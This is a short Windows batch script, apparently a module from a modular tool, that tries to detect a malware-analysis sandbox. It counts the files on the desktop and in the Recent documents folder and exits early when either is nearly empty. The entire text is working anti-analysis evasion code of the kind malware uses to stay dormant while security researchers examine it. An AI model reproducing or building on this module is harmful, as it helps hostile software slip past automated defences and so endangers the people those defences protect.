REM provides: evasion_desktop_files
REM depends: (none)
REM description: Check desktop file count to detect empty sandbox desktops

REM Real users have files on their desktop
set "DESK_COUNT=0"
for /f %%c in ('dir /b "%USERPROFILE%\Desktop" 2^>nul ^| find /c /v ""') do (
    set "DESK_COUNT=%%c"
)

REM Empty or near-empty desktop = likely sandbox
if %DESK_COUNT% LEQ 2 exit /b 0

REM Also check for recent documents
set "RECENT_COUNT=0"
for /f %%c in ('dir /b "%APPDATA%\Microsoft\Windows\Recent" 2^>nul ^| find /c /v ""') do (
    set "RECENT_COUNT=%%c"
)

if %RECENT_COUNT% LEQ 3 exit /b 0
